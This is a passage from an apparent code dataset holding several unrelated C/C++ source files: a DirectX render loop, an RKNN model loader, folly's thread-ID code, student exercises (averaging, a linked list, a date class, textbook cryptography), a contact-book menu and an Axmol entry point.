4096);\n        g_FontTahoma = g_Renderer->AddFont(L\"Tahoma\", 15, FONT_FLAG_CLEAR_TYPE);\n    }\n    catch (const std::runtime_error &e)\n    {\n        MessageBox(NULL, e.what(), \"Error\", MB_OK | MB_ICONERROR);\n        return 0;\n    }\n\n    while (msg.message != WM_QUIT)\n    {\n        if (PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))\n        {\n            TranslateMessage(&msg);\n            DispatchMessage(&msg);\n        }\n        else\n        {\n            if (g_ResizeWidth != 0 && g_ResizeHeight != 0)\n            {\n                CleanupRenderTarget();\n                g_pSwapChain->ResizeBuffers(0, g_ResizeWidth, g_ResizeHeight, DXGI_FORMAT_UNKNOWN, 0);\n                g_ResizeWidth = g_",
    "// Copyright (c) 2023 by Rockchip Electronics Co., Ltd. All Rights Reserved.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// Modified by Q-engineering 4-6-2026\n//\n\n#include \"rk_common.h\"\n\n#include <iostream>\n#include <fstream>\n#include <cstdlib>                  // for malloc and free\n\n/*-------------------------------------------\n                  Functions\n-------------------------------------------*/\n\nvoid dump_tensor_attr(rknn_tensor_attr* attr)\n{\n  printf(\"\\tindex=%d, name=%s, \\n\\t\\tn_dims=%d, dims=[%d, %d, %d, %d], \\n\\t\\tn_elems=%d, size=%d, fmt=%s, \\n\\t\\ttype=%s, qnt_type=%s, \"\n         \"zp=%d, scale=%f\\n\",\n         attr->index, attr->name, attr->n_dims, attr->dims[0], attr->dims[1], attr->dims[2], attr->dims[3],\n         attr->n_elems, attr->size, get_format_string(attr->fmt), get_type_string(attr->type),\n         get_qnt_type_string(attr->qnt_type), attr->zp, attr->scale);\n}\n\n// Function to read binary file into a buffer allocated in memory\nunsigned char* load_model(const char* filename, int& fileSize)\n{\n    std::ifstream file(filename, std::ios::binary | std::ios::ate); // Open file in binary mode and seek to the end\n\n    if (!file.is_open()) {\n        std::cerr << \"Failed to open file: \" << filename << std::endl;\n        return nullptr;\n    }\n\n    fileSize = (int) file.tellg(); // Get the file size\n    file.seekg(0, std::ios::beg); // Seek back to the beginning\n\n    char* buffer = (char*)malloc(fileSize); // Allocate memory for the buffer\n\n    if (!buffer) {\n        std::cerr << \"Memory allocation failed.\" << std::endl;\n        return nullptr;\n    }\n\n    file.read(buffer, fileSize); // Read the entire file into the buffer\n    file.close(); // Close the file\n\n    return (unsigned char*) buffer;\n}\n\n",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <folly/system/ThreadId.h>\n\n#include <folly/Likely.h>\n#include <folly/portability/PThread.h>\n#include <folly/portability/SysSyscall.h>\n#include <folly/portability/Unistd.h>\n#include <folly/portability/Windows.h>\n#include <folly/synchronization/RelaxedAtomic.h>\n#include <folly/system/AtFork.h>\n\nnamespace folly {\n\nuint64_t getCurrentThreadID() {\n#if __APPLE__\n  return uint64_t(pthread_mach_thread_np(pthread_self()));\n#elif defined(_WIN32)\n  return uint64_t(GetCurrentThreadId());\n#else\n  return uint64_t(pthread_self());\n#endif\n}\n\nnamespace detail {\n\nuint64_t getOSThreadIDSlow() {\n#if __APPLE__\n  uint64_t tid;\n  pthread_threadid_np(nullptr, &tid);\n  return tid;\n#elif defined(_WIN32)\n  return uint64_t(GetCurrentThreadId());\n#elif defined(__FreeBSD__)\n  long tid;\n  thr_self(&tid);\n  return uint64_t(tid);\n#elif defined(__EMSCRIPTEN__)\n  return 0;\n#else\n  return uint64_t(syscall(FOLLY_SYS_gettid));\n#endif\n}\n\n} // namespace detail\n\nnamespace {\n\nstruct CacheState {\n  CacheState() {\n    AtFork::registerHandler(\n        this, [] { return true; }, [] {}, [] { ++epoch; });\n  }\n  ~CacheState() { AtFork::unregisterHandler(this); }\n\n  // Used to invalidate all caches in the child process on fork. Start at 1 so\n  // that 0 is always invalid.\n  static relaxed_atomic<uint64_t> epoch;\n};\n\nrelaxed_atomic<uint64_t> CacheState::epoch{1};\n\nCacheState gCacheState;\n\n} // namespace\n\nuint64_t getOSThreadID() {\n  thread_local std::pair<uint64_t, uint64_t> cache{0, 0};\n  auto epoch = CacheState::epoch.load();\n  if (FOLLY_UNLIKELY(epoch != cache.first)) {\n    cache = {epoch, detail::getOSThreadIDSlow()};\n  }\n  return cache.second;\n}\n\n} // namespace folly\n",
    "#include <stdio.h>\nint main(void)\n{\n\t// \ubcc0\uc218\ub97c \uc120\uc5b8\ud55c\ub2e4\n    float num1 = 0;\n\tfloat num2 = 0;\n\tfloat num3 = 0;\n\tfloat num4 = 0;\n\tfloat num5 = 0;\n\t// \ud3c9\uade0\uacfc \ucd5c\ub300, \ucd5c\uc18c\ub97c \uacb0\uc815\ud560  \ubcc0\uc218\ub97c \uc120\uc5b8\ud55c\ub2e4\n\tfloat avg = 0;\n\tfloat max, min = 0;\n\t\n\n\t//\uc0ac\uc6a9\uc790\ub85c \ubd80\ud130 \uac12\uc744 \uc785\ub825\ubc1b\ub294\ub2e4\n\tprintf(\"1 \ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624. \");\n\tscanf_s(\"%f\", &num1);\n\tprintf(\"2 \ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624. \"); \n\tscanf_s(\"%f\", &num2);\n\tprintf(\"3 \ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624. \"); \n\tscanf_s(\"%f\", &num3);\n\tprintf(\"4 \ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624. \"); \n\tscanf_s(\"%f\", &num4);\n\tprintf(\"5 \ubc88\uc9f8 \uc2e4\uc218\ub97c \uc785\ub825\ud558\uc2dc\uc624. \"); \n\tscanf_s(\"%f\", &num5);\n\n\t//\ud3c9\uade0\uac12\uc744 \uad6c\ud55c\ub2e4\n\tavg = (num1 + num2 + num3 + num4 + num5)/ 5;\n\t//\ucd5c\ub300 \ucd5c\uc18c\ub97c \uad6c\ud55c\ub2e4\n\tmax = num1;\n\n\tif (num2 > max) \n\t{\n\t\tmax = num2; \n\t}\n\tif (num3 > max) \n\t{\n\t\tmax = num3; \n\t}\n\tif (num4 > max) \n\t{\n\t\tmax = num4; \n\t}\n    if (num5 > max) \n\t{\n\t\tmax = num5; \n\t}\n\n\tmin = num1;\n\tif (num2 < min) {\n\t\tmin = num2;\n\t}\n\tif (num3 < min) {\n\t\tmin = num3;\n\t}\n\tif (num4 < min) {\n\t\tmin = num4;\n\t}\n\tif (num5 < min) {\n\t\tmin = num5;\n\t}\n\t//\uacb0\uacfc\ub97c \ucd9c\ub825\ud55c\ub2e4\n\tprintf(\"---- \uacb0\uacfc ----\\n\");\n\tprintf(\"\ud3c9\uade0\uc740 %f\uc785\ub2c8\ub2e4.\\n\",avg);\n\tprintf(\"\ucd5c\ub313\uac12\uc740 %f\uc785\ub2c8\ub2e4.\\n\",max);\n\tprintf(\"\ucd5c\uc18c\uac12\uc740 %f\uc785\ub2c8\ub2e4.\\n\",min);\n\t\n\treturn 0;\n}",
    "\ufeff#include <iostream>\n#include <time.h>\n#include <fstream>\nusing namespace std;\nbool simple(long long int a)\n{\n    int i;\n    for (i = 2; i < sqrt(a); i++)\n    {\n        if (a % i == 0)\n            return false;\n    }\n    return true;\n}\n\nlong long int pow_mod(long long int a, long long int n, long long int p)\n{\n    long long int i, k, n2 = 0, res = 1, * N2;\n    /*if (!simple(p))\n    {\n        cout << \" p \u043d\u0435 \u043f\u0440\u043e\u0441\u0442\u043e\u0435.\\n\";\n        return 0;\n    }*/\n    for (i = 1, n2 = 1; i * 2 < n; i *= 2, n2++);\n    N2 = new long long int[n2 + 1];\n    for (i = 0, k = n; i <= n2; i++, k /= 2)\n        N2[i] = k % 2;\n\n    for (i = 0; i <= n2; i++)\n    {\n        if (i > 0)\n            k = ((k % p) * (k % p)) % p;\n        else\n            k = a % p;\n        if (N2[i] > 0)\n            res = ((res % p) * (k % p)) % p;\n    }\n    delete[] N2;\n    return res;\n}\n\nint evk(long long int a, long long int b, long long int& x, long long int& y)\n{\n    int i;\n    long long int obm, q, U[3] = { a, 1, 0 }, V[3] = { b, 0, 1 }, T[3];\n    if (a < b)\n    {\n        obm = a;\n        a = b;\n        b = obm;\n    }\n    while (V[0] != 0)\n    {\n        q = U[0] / V[0];\n        for (i = 0; i < 3; i++)\n        {\n            if (i > 0)\n                T[i] = U[i] - q * V[i];\n            else\n                T[i] = U[i] % V[i];\n            U[i] = V[i];\n            V[i] = T[i];\n        }\n    }\n    x = U[1];\n    y = U[2];\n    return U[0];\n}\n\nlong long int dh()\n{\n    long long int p, q = 0, g, X[2], Y[2], Z[2];\n    while (!simple(q) || (q == 0) || !simple(p))\n    {\n        q = rand() % (long long int)pow(10, 9);\n        p = 2 * q + 1;\n    }\n    do\n    {\n        g = 2 + rand() % (p - 2);\n    } while (pow_mod(g, q, p) == 1);\n    X[0] = 2 + rand() % (p - 2);\n    X[1] = 2 + rand() % (p - 2);\n    Y[0] = pow_mod(g, X[0], p);\n    Y[1] = pow_mod(g, X[1], p);\n    Z[0] = pow_mod(Y[1], X[0], p);\n    Z[1] = pow_mod(Y[0], X[1], p);\n    //cout << \" p = \" << p << \", Ya = \" << Y[0] << \", Yb = \" << Y[1] << \", Za = \" << Z[0] << \" = Zb = \" << Z[1] << endl;\n    return Z[1];\n}\n\nvoid shmshv(long long int a, long long int p, long long int y)\n{\n    long long int i, j, m = sqrt(p) + 1, k = m, * Ay, * A;\n    if (!simple(p))\n    {\n        cout << \" p \u043d\u0435 \u043f\u0440\u043e\u0441\u0442\u043e\u0435.\\n\";\n        return;\n    }\n    Ay = new long long int[m];\n    A = new long long int[k];\n    for (i = 0; i < m; i++)\n        Ay[i] = (pow_mod(a, i, p) * (y % p)) % p;\n\n    for (i = 0; i < k; i++)\n    {\n        A[i] = pow_mod(a, m * (i + 1), p);\n        for (j = 0; j < m; j++)\n        {\n            if (A[i] == Ay[j])\n            {\n                cout << \" i = \" << i + 1 << \", j = \" << j << \", x = \" << (i + 1) * m - j << \" (\" << pow_mod(a, (i + 1) * m - j, p) << \")\\n\";\n                break;\n            }\n        }\n    }\n    delete[] Ay;\n    delete[] A;\n}\n\nlong long int shamir(long long int m)\n{\n    long long int p = 0, cA = 0, cB = 0, dA = 0, dB = 0, x[4];\n    while ((p == 0) || (p <= m) || !simple(p))\n        p = rand() % (long long int)pow(10, 9);\n\n    while ((cA == 0) || (evk(cA, p - 1, dA, x[0]) != 1))\n        cA = rand() % (long long int)pow(10, 9);\n\n    while ((cB == 0) || (evk(cB, p - 1, dB, x[0]) != 1))\n        cB = rand() % (long long int)pow(10, 9);\n\n    while (dA < 0)\n        dA += (p - 1);\n    while (dB < 0)\n        dB += (p - 1);\n    x[0] = pow_mod(m, cA, p);\n    x[1] = pow_mod(x[0], cB, p);\n    x[2] = pow_mod(x[1], dA, p);\n    x[3] = pow_mod(x[2], dB, p);\n    return x[3];\n}\n\nlong long int vernam(long long int m)\n{\n    long long int i, n, n2, x = m, k, e;\n    for (n = 0, x = m; x > 0; n++, x /= 2);\n    do\n    {\n        k = dh();\n        for (n2 = 0, x = k; x > 0; n2++, x /= 2);\n    } while (n != n2);\n    e = m ^ k;\n    return e ^ k;\n}\n\nlong long int elgam(long long int m)\n{\n    long long int p = 0, q = 0, g = 0, c[2], d[2], k, r, e, m2;\n    while (!simple(q) || (q == 0) || !simple(p) || (p <= m))\n    {\n        q = rand() % (long long int)pow(10, 9);\n        p = 2 * q + 1;\n    }\n    do\n    {\n        g = 2 + rand() % (p - 2);\n    } while (pow_mod(g, q, p) == 1);\n    c[0] = 2 + rand() % (p - 1);\n    d[0] = pow_mod(g, c[0], p);\n    c[1] = 2 + rand() % (p - 1);\n    d[1] = pow_mod(g, c[1], p);\n\n    k = 1 + rand() % (p - 1);\n    r = pow_mod(g, k, p);\n    e = ((m % p) * pow_mod(d[1], k, p)) % p;\n\n    m2 = ((e % p) * pow_mod(r, p - 1 - c[1], p)) % p;\n    return m2;\n}\n\nvoid gen(long long int& c, long long int& d, long long int& n)\n{\n    long long int p = 0, q = 0, f, x;\n    d = 0;\n    while ((p == 0) || !simple(p))\n        p = rand() % (long long int)pow(10, 6);\n    while ((q == 0) || !simple(q))\n        q = rand() % (long long int)pow(10, 6);\n    n = p * q;\n    f = (p - 1) * (q - 1);\n    while ((d == 0) || (d >= f) || (evk(f, d, x, c) != 1))\n        d = rand() % (long long int)pow(10, 6);\n    while (c < 0)\n        c += f;\n    cout << \" n = \" << n << \", p = \" << p << \", q = \" << q << \", f = \" << f << endl;\n    cout << \" c = \" << c << \", d = \" << d << \" | \" << ((c % f) * (d % f)) % f << endl;\n}\n\nlong long int rsa(long long int m)\n{",
    "// Learn abort all of doubley LinkedList\n#include <iostream>\n#include <vector>\nusing namespace std;\n\nstruct Node {\n    int data;\n    Node* prev;\n    Node* next;\n\n    Node(int x) {\n        data = x;\n        prev = NULL;\n        next = NULL;\n    }\n};\n\n// Array to Doubly LinkedList\nNode* ArrayToDoublyLL (vector <int> a) {\n    Node* head = new Node(a[0]);\n    Node* mover = head;\n    for(int i = 1; i < a.size(); ++i) {\n        Node* tmp = new Node (a[i]);\n        mover -> next = tmp;\n        tmp -> prev = mover;\n        mover = tmp;\n    }\n    return head;\n}\n// Print the DLL\nvoid print (Node* head) {\n    Node* tmp = head;\n    while (tmp) {\n        cout << tmp->data << ' ';\n        tmp = tmp->next;\n    }\n    cout << endl;\n}\n// Insertion at the Beginning\nNode* insertion_beginning(Node* head, int data) {\n    Node* tmp = new Node (data);\n    if(head != NULL) {\n        tmp->next = head;\n        head->prev = tmp;\n    }  \n    return tmp;\n}\n// Insertion at the end\nNode* insertion_end(Node* head, int data) {\n    Node* tmp = new Node (data);\n    if(head == NULL) return tmp;\n\n    Node* mover = head;\n    while (mover->next) mover = mover->next;\n    mover->next = tmp;\n    tmp->prev = mover;\n    return head;\n}\n// Insertion at the kth possition\nNode* insertion_kth_pos(Node* head, int pos, int data) {\n    Node* tmp = new Node(data);\n    if(pos == 1) return insertion_beginning(head, data);\n\n    Node* mover = head;\n    int cnt = 1;\n    while (mover->next and cnt < pos-1) {\n        mover = mover -> next;\n        cnt++;\n    }\n    \n    if(cnt == pos-1) {\n        tmp->next = mover->next;\n        mover->next = tmp;\n        tmp->prev = mover;\n        if(tmp->next) tmp->next->prev = tmp;\n    }\n           \n    return head;\n}\n\n// Deletion at the beginning\nNode* deletion_fist(Node* head) {\n    head = head->next;\n    free(head->prev);\n    head->prev = NULL;\n    return head;\n}\n// Deletion at the end\nNode* deletion_last(Node* head) {\n    Node* tmp = head;\n    while (tmp->next->next) tmp = tmp->next;\n    free(tmp->next);\n    tmp->next = NULL;\n    return head;\n}\n// Deletion kth pos\nNode* deletion_kth_pos (Node* head, int pos) {\n    if(head == NULL or pos <= 0) return head;\n\n    int cnt = 1;\n    Node* tmp = head;\n    while (tmp and cnt < pos) {\n        tmp = tmp->next;\n        cnt++;\n    }\n    // if pos is more than the number of nodes\n    if(tmp == NULL) return head;\n\n    if(tmp == head) {\n        head = head->next;\n        if(head) head->prev = NULL;\n    }\n    else {\n        if(tmp->next) tmp->next->prev = tmp->prev;\n        if(tmp->prev) tmp->prev->next = tmp->next;\n    }\n    free(tmp);\n    return head;\n}\nint main()\n{\n    // 1. insertion\n    // 2. deletation\n    vector <int> a { 2, 3, 4};\n    Node* head = ArrayToDoublyLL(a);\n    cout << \"Array to Doubly LL:  \"; \n    print(head);\n    \n    // Insertion\n    head = insertion_beginning(head, 1);\n    cout << \"Insertion at the beginning 1:  \";\n    print(head);\n    head = insertion_end(head, 5);\n    cout << \"Insertion at the end 5:  \";\n    print(head);\n    head = insertion_kth_pos(head, 5, 9);\n    cout << \"Insertion at kth pos :  \";\n    print(head);\n\n    // Deletion\n    head = deletion_fist(head);\n    cout << \"After delete the 1st : \";\n    print(head);\n    head = deletion_last(head);\n    cout << \"After delete the end : \";\n    print(head);\n    head = deletion_kth_pos(head, 3);\n    cout << \"After delete kth : \";\n    print(head);\n    \n}\n",
    "// Final Project Milestone 1 \n// Date Module\n// File\tDate.cpp\n// Version 1.0\n// Author\tFardad Soleimanloo\n// Revision History\n// -----------------------------------------------------------\n// Name               Date                 Reason\n// Hsiao-Kang Chang     07/02               init\n// Hsiao-Kang Chang     07/05               done\n/////////////////////////////////////////////////////////////////\n#define _CRT_SECURE_NO_WARNINGS\n#include <iomanip>\n#include <iostream>\n#include <ctime>\n#include \"Date.h\"\nusing namespace std;\nnamespace seneca {\n    //for testing purposes\n    bool seneca_test = false;\n    int seneca_year = 2024;\n    int seneca_mon = 12;\n    int seneca_day = 25;\n    //for testing purposes\n   bool Date::validate() {\n      errCode(NO_ERROR);\n      if (m_year < MIN_YEAR || m_year > m_CUR_YEAR + 1) {\n         errCode(YEAR_ERROR);\n      }\n      else if (m_mon < 1 || m_mon > 12) {\n         errCode(MON_ERROR);\n      }\n      else if (m_day < 1 || m_day > mdays()) {\n         errCode(DAY_ERROR);\n      }\n      return !bad();\n   }\n   int Date::mdays()const {\n      int days[] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31, -1 };\n      int mon = m_mon >= 1 && m_mon <= 12 ? m_mon : 13;\n      mon--;\n      return days[mon] + int((mon == 1) * ((m_year % 4 == 0) && (m_year % 100 != 0)) || (m_year % 400 == 0));\n   }\n    int Date::systemYear()const {\n        int theYear = seneca_year;\n        if (!seneca_test) {\n            time_t t = time(NULL);\n            tm lt = *localtime(&t);\n            theYear = lt.tm_year + 1900;\n        }\n        return theYear;\n    }\n    void Date::setToToday() {\n        if (seneca_test) {\n            m_day = seneca_day;\n            m_mon = seneca_mon;\n            m_year = seneca_year;\n        }\n        else {\n            time_t t = time(NULL);\n            tm lt = *localtime(&t);\n            m_day = lt.tm_mday;\n            m_mon = lt.tm_mon + 1;\n            m_year = lt.tm_year + 1900;\n        }\n        errCode(NO_ERROR);\n    }\n   int Date::daysSince0001_1_1()const { // Rata Die day since 0001/01/01 \n      int ty = m_year;\n      int tm = m_mon;\n      if (tm < 3) {\n         ty--;\n         tm += 12;\n      }\n      return 365 * ty + ty / 4 - ty / 100 + ty / 400 + (153 * tm - 457) / 5 + m_day - 306;\n   }\n   Date::Date() :m_CUR_YEAR(systemYear()) {\n      setToToday();\n   }\n   Date::Date(int year, int mon, int day) : m_CUR_YEAR(systemYear()) {\n      m_year = year;\n      m_mon = mon;\n      m_day = day;\n      validate();\n   }\n   const char* Date::dateStatus()const {\n      return DATE_ERROR[errCode()];\n   }\n   int Date::currentYear()const {\n      return m_CUR_YEAR;\n   }\n   void Date::errCode(int readErrorCode) {\n      m_ErrorCode = readErrorCode;\n   }\n   int Date::errCode()const {\n      return m_ErrorCode;\n   }\n   bool Date::bad()const {\n      return m_ErrorCode != 0;\n   }\n\n    std::istream &Date::read(istream &is) {\n       //Clears the error code by setting it NO_ERROR\n        //m_ErrorCode = NO_ERROR;\n        errCode(NO_ERROR);\n        //TODO check\n        char sep1, sep2;\n        is >> m_year >> sep1 >> m_mon >> sep2 >> m_day;\n        if (is.fail()){\n            errCode(CIN_FAILED);\n            is.clear();\n        } else {\n            validate();\n        }\n//        //Flushes the keyboard\n//        while (ch != '\\n') {\n//            is.get(ch);\n//        }\n        return is;\n    }\n\n    std::ostream &Date::write(ostream &os) const {\n        if (bad()) {//check is true (if !=0) means having error\n            os << dateStatus();//print the \u201cdateStatus()\n        } else {\n            os << m_year << '/' << setw(2) << setfill('0') << m_mon << '/' << setw(2) << setfill('0') << m_day;\n            os.fill(' ');//reset the fill\n        }\n        return os;\n    }\n\n    bool operator==(const Date& left,const Date& right) {\n        return (left.daysSince0001_1_1() == right.daysSince0001_1_1());\n    }\n\n    bool operator!=(const Date& left,const Date& right) {\n        return (left.daysSince0001_1_1() != right.daysSince0001_1_1());\n    }\n\n    bool operator>=(const Date& left,const Date& right){\n        return (left.daysSince0001_1_1() >= right.daysSince0001_1_1());\n    }\n\n    bool operator<=(const Date& left,const Date& right) {\n        return (left.daysSince0001_1_1() <= right.daysSince0001_1_1());\n    }\n\n    bool operator<(const Date& left,const Date& right){\n        return (left.daysSince0001_1_1() < right.daysSince0001_1_1());\n    }\n\n    bool operator>(const Date& left,const Date& right){\n        return (left.daysSince0001_1_1() > right.daysSince0001_1_1());\n    }\n\n    int Date::operator-(const Date &right) const{\n        return (this->daysSince0001_1_1() - right.daysSince0001_1_1());\n    }\n\n    Date::operator bool() const {\n        return errCode() == 0;\n    }\n    ostream& operator<<(ostream& os, const Date& RO) {\n      return RO.write(os);\n   }\n   istream& operator>>(istream& is, Date& RO) {\n      return RO.read(is);\n   }\n\n\n}\n",
    "#include \"ContactBook.hpp\"\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <limits>\r\n\r\nusing namespace std;\r\n\r\n// Display the home page\r\nvoid Home(ContactBook &book)\r\n{\r\n\tcout << \"<---CONTACT BOOK APPLICATION--->\\n\";\r\n\tif (book.totalContactsCount() > 0)\r\n\t{\r\n\t\tcout << \"Total contacts = \" << book.totalContactsCount() << endl;\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tbook.displayContactsNames();\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << book.totalContactsCount() << \"# ADD CONTACT\\n\";\r\n\t\tcout << book.totalContactsCount() + 1 << \"# SEARCH CONTACT\\n\";\r\n\t\tcout << book.totalContactsCount() + 2 << \"# VIEWE SEARCH HISTORY\\n\";\r\n\t\tcout << book.totalContactsCount() + 3 << \"# FREQUENTLY VIEWED CONTACTS\\n\";\r\n\t\tcout << book.totalContactsCount() + 4 << \"# GROUPS\\n\";\r\n\t\tcout << book.totalContactsCount() + 5 << \"# EXIT\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << \"ENTER YOUR CHOICE: \";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"No contact saved yet.\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << book.totalContactsCount() << \"# ADD CONTACT\\n\";\r\n\t\tcout << book.totalContactsCount() + 1 << \"# SEARCH CONTACT\\n\";\r\n\t\tcout << book.totalContactsCount() + 2 << \"# VIEWE SEARCH HISTORY\\n\";\r\n\t\tcout << book.totalContactsCount() + 3 << \"# FREQUENTLY VIEWED CONTACTS\\n\";\r\n\t\tcout << book.totalContactsCount() + 4 << \"# GROUPS\\n\";\r\n\t\tcout << book.totalContactsCount() + 5 << \"# EXIT\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << \"ENTER YOUR CHOICE: \";\r\n\t}\r\n}\r\n\r\n// Contact details page\r\nvoid Detail(size_t index, ContactBook &book)\r\n{\r\n\tcout << \"<---DETAILS OF CONTACT--->\\n\";\r\n\tContact temp{book.getContactByIndex(index)};\r\n\tcout << endl\r\n\t\t << temp;\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"1# EDIT CONTACT\\n\";\r\n\tcout << \"2# DELETE CONTACT\\n\";\r\n\tcout << \"3# BACK\\n\";\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"ENTER YOUR CHOICE: \";\r\n}\r\n\r\n// Edit page from detail page\r\nvoid EditFromDetail(size_t index, ContactBook &book)\r\n{\r\n\tcout << \"<---ENTER THE UPDATED INFORMATION--->\\n\";\r\n\tContact temp;\r\n\tcin.ignore();\r\n\tcin >> temp;\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"<---UPDATED CONTACT--->\\n\";\r\n\tcout << endl\r\n\t\t << temp;\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"1# SAVE\\n\";\r\n\tcout << \"2# CANCEL\\n\";\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"ENTER YOUR CHOICE: \";\r\n\r\n\tint choice;\r\n\tcin >> choice;\r\n\r\n\tif (choice == 1)\r\n\t{\r\n\t\tbook.editContact(index, temp);\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << \"CONTACT UPDATED SUCCESSFULLY\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tSleep(1000);\r\n\t}\r\n\telse\r\n\t\treturn;\r\n}\r\n\r\n// Add contact page\r\nvoid Add(ContactBook &book)\r\n{\r\n\tcout << \"<---ADD CONTACT--->\\n\";\r\n\tContact temp;\r\n\tcin.ignore();\r\n\tcin >> temp;\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"1# SAVE\\n\";\r\n\tcout << \"2# CANCEL\\n\";\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"ENTER YOUR CHOICE: \";\r\n\r\n\tint choice;\r\n\tcin >> choice;\r\n\r\n\tif (choice == 1)\r\n\t{\r\n\t\tbook.addContact(temp);\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << \"CONTACT ADDDED SUCCESSFULLY\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tSleep(1000);\r\n\t}\r\n\r\n\telse\r\n\t\treturn;\r\n}\r\n\r\n// Search contact page\r\nvoid Search(ContactBook &book)\r\n{\r\n\tcout << \"<---SEARCH CONTACT BY NAME OR PHONE NUMBER--->\\n\";\r\n\tstring search;\r\n\tcout << \"ENTER SEARCH KEYWORD: \";\r\n\tcin.ignore();\r\n\tgetline(cin, search);\r\n\tbook.advanceSearch(search);\r\n\tcout << \"--------------------------------\\n\";\r\n\tif (book.totalAdvanceContactCount() > 0)\r\n\t{\r\n\t\tcout << \"Contacts found = \" << book.totalAdvanceContactCount() << endl;\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tbook.displayAdvanceSearchedContactsNames();\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << book.totalAdvanceContactCount() << \"# BACK\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << \"ENTER YOUR CHOICE: \";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"No any contact found\\n\";\r\n\t\tcout << book.totalAdvanceContactCount() << \"# BACK\\n\";\r\n\t\tcout << \"--------------------------------\\n\";\r\n\t\tcout << \"ENTER YOUR CHOICE: \";\r\n\t\treturn;\r\n\t}\r\n}\r\n\r\n// Detail of advance search contact\r\nvoid DetailFromSearch(size_t index, ContactBook &book)\r\n{\r\n\tbook.search(index);\r\n\tcout << \"<---DETAILS OF CONTACT--->\\n\";\r\n\tContact temp{book.getAdvanceSearchedByIndex(index)};\r\n\tcout << endl\r\n\t\t << temp;\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"1# EDIT CONTACT\\n\";\r\n\tcout << \"2# DELETE CONTACT\\n\";\r\n\tcout << \"3# BACK\\n\";\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"ENTER YOUR CHOICE: \";\r\n}\r\n\r\n// Edit from detail from search\r\nvoid EditFromDetailFromSearch(size_t index, ContactBook &book)\r\n{\r\n\tcout << \"<---ENTER THE UPDATED INFORMATION--->\\n\";\r\n\tContact temp;\r\n\tcin.ignore();\r\n\tcin >> temp;\r\n\tcout << \"--------------------------------\\n\";\r\n\tcout << \"<---UPDATED CONTACT--->\\n\";\r\n\tcout << endl\r\n\t\t << temp;\r\n\tcout << \"---------------------------",
    "/****************************************************************************\n Copyright (c) 2017-2018 Xiamen Yaji Software Co., Ltd.\n Copyright (c) 2019-present Axmol Engine contributors (see AUTHORS.md).\n\n https://axmolengine.github.io/\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the \"Software\"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in\n all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n THE SOFTWARE.\n ****************************************************************************/\n\n#include \"AppDelegate.h\"\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <string>\n\nUSING_NS_AX;\n\nint main(int argc, char** argv)\n{\n    // create the application instance\n    AppDelegate app;\n    return Application::getInstance()->run();\n}\n",
